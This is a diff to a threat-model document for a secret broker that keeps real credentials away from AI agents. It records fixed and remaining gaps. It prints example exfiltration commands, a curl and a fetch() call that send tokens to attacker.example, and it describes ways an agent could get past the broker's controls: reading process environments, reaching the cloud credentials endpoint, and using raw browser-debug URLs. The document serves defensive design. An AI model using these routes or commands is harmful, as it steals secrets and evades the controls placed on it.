@@ -43,10 +43,10 @@ go around it to the secret store. Three properties are required.
 
 ### Worked example: AWS (ECS/Fargate)
 
-As shipped, the AWS provider (`src/providers/aws.ts`) reads per-agent secrets from SSM Parameter
+As shipped, the AWS provider (`packages/provider-aws/src/index.ts`) reads per-agent secrets from SSM Parameter
 Store under a per-agent prefix and shared secrets from Secrets Manager, and
 optionally assumes a role named by `COATCHECK_AWS_ROLE_ARN` via STS before doing so
-(`src/providers/aws.ts`).
+(`packages/provider-aws/src/index.ts`).
 
 - Agent task role: explicit `Deny` on `ssm:GetParameter*` for
   `…/user-secrets/*` and no `secretsmanager:GetSecretValue` on shared secrets.
@@ -76,6 +76,19 @@ is a different principal. Property 2 is violated. Ways to close it:
   execution role, not the task role), so the agent container never sees it.
 - Block the agent container from the credentials endpoint (`169.254.170.2`)
   with egress rules, if nothing in the agent needs cloud credentials.
+
+### The `env` and `file` providers
+
+Property 1 then means the agent cannot read the broker's environment or the
+secrets file. Both hold real values in plaintext.
+
+- `env`: set the `COATCHECK_SECRET_*` variables on the **coatcheck container
+  only**. In a shared PID namespace, or when both processes run as the same
+  OS user on one host, the agent can read `/proc/<pid>/environ`; run coatcheck
+  in its own container, or as a different user.
+- `file`: the agent must not be able to read `COATCHECK_SECRETS_FILE` or
+  write its directory (a writable directory lets it swap the file). Don't
+  mount it into the agent container; refresh writes keep mode `0600`.
 
 Other platforms have the same shape: on Kubernetes, containers in a pod share
 a service account, so a sidecar with a separate cloud identity needs either a
@@ -115,24 +128,26 @@ the agent can also reach the internet directly.
 
 | Property | Mechanism |
 |---|---|
-| Real values never enter the agent's env, files, or model context via the vault API | `/_vault/*` and `/_secret/*` return tickets, never values (except fields the secret explicitly lists in `_cleartext`) (`src/vault-handler.ts`) |
+| Real values never enter the agent's env, files, or model context via the vault API | `/_vault/*` and `/_secret/*` return tickets, never values (except fields the secret explicitly lists in `_cleartext`) (`packages/core/src/vault-handler.ts`) |
 | A ticket alone is useless outside the broker | 32 random bytes; resolves only inside coatcheck's token store |
-| Tickets are bound to destination hosts | Each ticket snapshots its secret's allowed hosts at mint: the intersection of the operator's policy file and the secret's in-band `_allowed_hosts` (`src/secret-binding.ts`). Unbound secrets get no ticket (`403`) unless `COATCHECK_ALLOW_UNBOUND_SECRETS=1`. At swap time the host is the validated `CONNECT` target on HTTPS (upstream TLS verification makes it the real recipient; `Host` and SNI are ignored) and the WHATWG-parsed URL host on plain HTTP, which only matches `http://` entries, so loopback and private listeners never match unless listed. A mismatch is answered `403` (`X-Coatcheck-Denied: host-mismatch`) and nothing is forwarded; one denied ticket denies the whole request (`TokenStore.replaceAll`, `src/mitm.ts`, `src/forward.ts`) |
-| Swapping can't redirect a request | On plain HTTP, tickets are swapped only in the path, query and headers, never in the host or userinfo that decide where the request goes (`src/forward.ts`) |
-| OAuth refresh can't send `client_secret` elsewhere | The `token_url` host must be one of the secret's allowed hosts, checked before the token endpoint is called; the refreshed ticket inherits the binding (`src/vault-handler.ts`) |
-| Tickets expire | 900 s default (`COATCHECK_TICKET_TTL_SECONDS`); session-bound tickets 600 s default, 1800 s max (`src/vault-handler.ts`) |
+| Tickets are bound to destination hosts | Each ticket snapshots its secret's allowed hosts at mint: the intersection of the operator's policy file and the secret's in-band `_allowed_hosts` (`packages/core/src/secret-binding.ts`). Unbound secrets get no ticket (`403`) unless `COATCHECK_ALLOW_UNBOUND_SECRETS=1`. At swap time the host is the validated `CONNECT` target on HTTPS (upstream TLS verification makes it the real recipient; `Host` and SNI are ignored) and the WHATWG-parsed URL host on plain HTTP, which only matches `http://` entries, so loopback and private listeners never match unless listed. A mismatch is answered `403` (`X-Coatcheck-Denied: host-mismatch`) and nothing is forwarded; one denied ticket denies the whole request (`TokenStore.replaceAll`, `packages/core/src/mitm.ts`, `packages/core/src/forward.ts`) |
+| Swapping can't redirect a request | On plain HTTP, tickets are swapped only in the path, query and headers, never in the host or userinfo that decide where the request goes (`packages/core/src/forward.ts`) |
+| OAuth refresh can't send `client_secret` elsewhere | The `token_url` host must be one of the secret's allowed hosts, checked before the token endpoint is called; the refreshed ticket inherits the binding (`packages/core/src/vault-handler.ts`) |
+| Tickets expire | 900 s default (`COATCHECK_TICKET_TTL_SECONDS`); session-bound tickets 600 s default, 1800 s max (`packages/core/src/vault-handler.ts`) |
 | `curl -v` on the agent side shows only the ticket | Substitution happens after TLS termination, on coatcheck's upstream leg |
-| Session-bound (browser) tickets never resolve on HTTP(S) | `TokenStore.replaceAll` skips them (`src/token-store.ts`) |
-| Shared secrets are allowlisted | `/_secret/{name}` refuses names not listed under `shared` in the operator's policy file; with no policy file, it refuses every name (`src/policy.ts`, `src/vault-handler.ts`) |
-| Secret names are validated before any provider call | `^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$` (no `/`, no leading `.`), checked after URL-decoding on every route that takes a name; invalid names get `400` (`isValidSecretName`, `src/secret-provider.ts`; `src/vault-handler.ts`) |
-| Upstream TLS is verified | `tls.connect` with default `rejectUnauthorized` (`src/mitm.ts`) |
-| CONNECT targets cannot reach a shell or the filesystem | Targets are parsed strictly (RFC 1123 DNS name or IP literal, port 1–65535; otherwise `400`) (`src/connect-target.ts`). Certificates are generated in-process with WebCrypto; leaf keys stay in memory (LRU, 1000 entries) and only the CA is written to disk, when `COATCHECK_CA_DIR` is set (`src/ca.ts`). |
-| Logs carry no values | Swap logs record secret names, host, and ticket age only (`src/swap-log.ts`) |
-| OAuth refresh failures don't log provider bodies | Only the HTTP status and the RFC 6749 `error` code (sanitised to `[A-Za-z0-9_.-]`, at most 64 chars) are logged (`oauthErrorCode`, `src/vault-handler.ts`) |
+| Session-bound (browser) tickets never resolve on HTTP(S) | `TokenStore.replaceAll` skips them (`packages/core/src/token-store.ts`) |
+| Browser login tickets fill only allowed origins | Substituted only in `Input.insertText`, only when the CDP session's committed main-frame origin matches the login secret's allowed hosts; unknown origin or navigation in progress → frame dropped with a CDP error; never substituted in `Runtime.*` (`packages/core/src/cdp/origin-tracker.ts`, `packages/core/src/cdp/substitution.ts`) |
+| Shared secrets are allowlisted | `/_secret/{name}` refuses names not listed under `shared` in the operator's policy file; with no policy file, it refuses every name (`packages/core/src/policy.ts`, `packages/core/src/vault-handler.ts`) |
+| Secret names are validated before any provider call | `^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$` (no `/`, no leading `.`), checked after URL-decoding on every route that takes a name; invalid names get `400` (`isValidSecretName`, `packages/core/src/secret-provider.ts`; `packages/core/src/vault-handler.ts`) |
+| Upstream TLS is verified | `tls.connect` with default `rejectUnauthorized` (`packages/core/src/mitm.ts`) |
+| CONNECT targets cannot reach a shell or the filesystem | Targets are parsed strictly (RFC 1123 DNS name or IP literal, port 1–65535; otherwise `400`) (`packages/core/src/connect-target.ts`). Certificates are generated in-process with WebCrypto; leaf keys stay in memory (LRU, 1000 entries) and only the CA is written to disk, when `COATCHECK_CA_DIR` is set (`packages/core/src/ca.ts`). |
+| Browser-service responses carry no raw CDP route | With CDP enabled, adapter hosts' JSON responses are rewritten: the Browserbase adapter points every Browserbase `ws(s)` URL (session `connectUrl`, debug endpoint `wsUrl` and `debuggerUrl`s) at the local CDP proxy and deletes `signingKey` and live-view URLs (`browser-adapters.ts`, `json-response-rewriter.ts`; attack test in `server.test.ts`) |
+| Logs carry no values | Swap logs record secret names, host, and ticket age only (`packages/core/src/swap-log.ts`) |
+| OAuth refresh failures don't log provider bodies | Only the HTTP status and the RFC 6749 `error` code (sanitised to `[A-Za-z0-9_.-]`, at most 64 chars) are logged (`oauthErrorCode`, `packages/core/src/vault-handler.ts`) |
 
 ## Known gaps
 
-Severity reflects the attacker above. File references are to `src/`.
+Severity reflects the attacker above. File references are to `packages/core/src/`.
 
 ### Fixed: tickets were not bound to destination hosts
 
@@ -146,7 +161,7 @@ curl -x http://127.0.0.1:3128 "http://attacker.example/?k=$TOK"
 
 delivered the real value to `attacker.example`, or to a listener the agent ran
 itself on loopback. Both now get `403` without being forwarded (see "Tickets
-are bound to destination hosts" above; `src/server.test.ts` performs both
+are bound to destination hosts" above; `packages/core/src/server.test.ts` performs both
 attacks). What remains:
 
 - An operator who sets `COATCHECK_ALLOW_UNBOUND_SECRETS=1` reopens this hole
@@ -154,8 +169,8 @@ attacks). What remains:
   `result=unbound`.
 - A secret's binding is only as narrow as its list. `*.example.com` trusts
   every subdomain, including ones a third party can host content on.
-- Browser (CDP) tickets record their login secret's hosts, but the CDP path
-  doesn't check them against the page yet (roadmap item 15).
+- Browser (CDP) tickets are checked against the page's main-frame origin,
+  not the frame that has focus; see "Browser injection" below.
 
 ### MEDIUM: tickets are reusable until TTL
 
@@ -225,9 +240,35 @@ inspected.
 
 ### Browser injection
 
-See `docs/design/cdp-injection.md` for gaps specific to the CDP path: no
-origin binding, `Runtime.evaluate` exfiltration, transform-blind redaction,
-uninspected binary frames, `mint-tokens` not validating `sessionId`.
+See `docs/design/cdp-injection.md` for gaps specific to the CDP path:
+script on an allowed origin can read the filled value, cross-origin iframe
+logins, transform-blind redaction, uninspected binary frames.
+
+Fixed by roadmap item 15: session-bound login tickets substituted on any
+page, and inside `Runtime.evaluate` / `Runtime.callFunctionOn`, so an agent
+could fill the real password into `https://attacker.example` or run
+`fetch('https://attacker.example/?p=' + 'cct_…')` with the real value.
+Tickets now substitute only in `Input.insertText`, only when the CDP
+session's committed main-frame origin (from `Page.frameNavigated`) is one of
+the login secret's allowed hosts, and never while that origin is unknown or a
+navigation is in progress; otherwise the frame is dropped with a CDP error
+(`cdp/origin-tracker.ts`, `cdp/substitution.ts`; attack tests in
+`cdp/substitution.test.ts`, `cdp/proxy.test.ts`, and the Playwright +
+Chromium `cdp/e2e.test.ts`).
+
+Fixed by roadmap item 14: `mint-tokens` accepted any `sessionId`, so a caller
+could mint credential tickets for a session that didn't exist or had already
+closed. It now requires a live sid from `CdpSessionStore` and answers `404`
+otherwise, before reading the credential (`vault-handler.ts`; attack tests in
+`vault-handler.test.ts`).
+
+Fixed by roadmap item 13: with a valid browser-service API-key ticket, the
+agent could call Browserbase's `/v1/sessions/{id}/debug` and receive raw CDP
+and live-view URLs that never pass through the CDP proxy (no substitution
+gate, no redaction). The adapter now rewrites those URLs to the local proxy or
+removes them, and strips `signingKey`. Remaining second routes: URL shapes the
+adapter doesn't recognise, vendor endpoints outside the adapter hosts, and
+browser-service hosts listed in `COATCHECK_PASSTHROUGH_HOSTS`.
 
 ## Residual risk accepted by design
 
